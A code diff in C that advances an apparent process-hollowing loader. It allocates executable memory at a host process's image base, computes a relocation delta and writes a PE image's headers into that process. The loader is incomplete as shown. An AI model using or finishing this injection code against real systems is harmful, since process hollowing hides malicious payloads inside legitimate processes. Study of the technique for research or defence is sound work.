@@ -23,6 +23,7 @@ INT main() {
 	DWORD					dwExeSize;
 	HGLOBAL					hgExe;
 	PVOID					pBuffer = NULL;
+	PVOID					pRemoteImage;
 
 	// Function pointers
 	NTUNMAPVIEWOFSECTION	pNtUnmapViewOfSection;
@@ -99,14 +100,37 @@ INT main() {
 	pSourceImage = GetLoadedImage((DWORD)pBuffer);
 	pSourceHeaders = GetNTHeaders((DWORD)pBuffer);
 	
-	
 	printf("[*] Allocating memory\r\n");
-	//PVOID pRemoteImage = VirtualAllocEx(hHostProcess,
-	//	pPEB->lpImageBaseAddress,
-	//	pSourceHeaders->OptionalHeader.SizeOfImage,
-	//	MEM_COMMIT | MEM_RESERVE,
-	//	PAGE_EXECUTE_READWRITE);
+	pRemoteImage = VirtualAllocEx(hHostProcess,
+		pPEB->lpImageBaseAddress,
+		pSourceHeaders->OptionalHeader.SizeOfImage,
+		MEM_COMMIT | MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE);
+	if (!pRemoteImage) {
+		printf("VirtualAllocEx call failed\r\n");
+		iRet = GetLastError();
+		goto lblCleanup;
+	}
 
+	DWORD dwDelta = (DWORD)pPEB->lpImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;
+	
+	printf("[*] Source image base: 0x%p\r\n", pSourceHeaders->OptionalHeader.ImageBase);
+	printf("[*] Destination image base: 0x%p\r\n", pPEB->lpImageBaseAddress);
+	printf("[*] Relocation delta: 0x%p\r\n", dwDelta);
+
+	if (!WriteProcessMemory(hHostProcess,
+		pPEB->lpImageBaseAddress,
+		pBuffer,
+		pSourceHeaders->OptionalHeader.SizeOfHeaders,
+		0)) 
+	{
+		printf("Error writing process memory\r\n");
+		iRet = GetLastError();
+		goto lblCleanup;
+	}
+
+	
+	
 lblCleanup:
 	if (processInformation.hProcess)
 		CloseHandle(processInformation.hProcess);
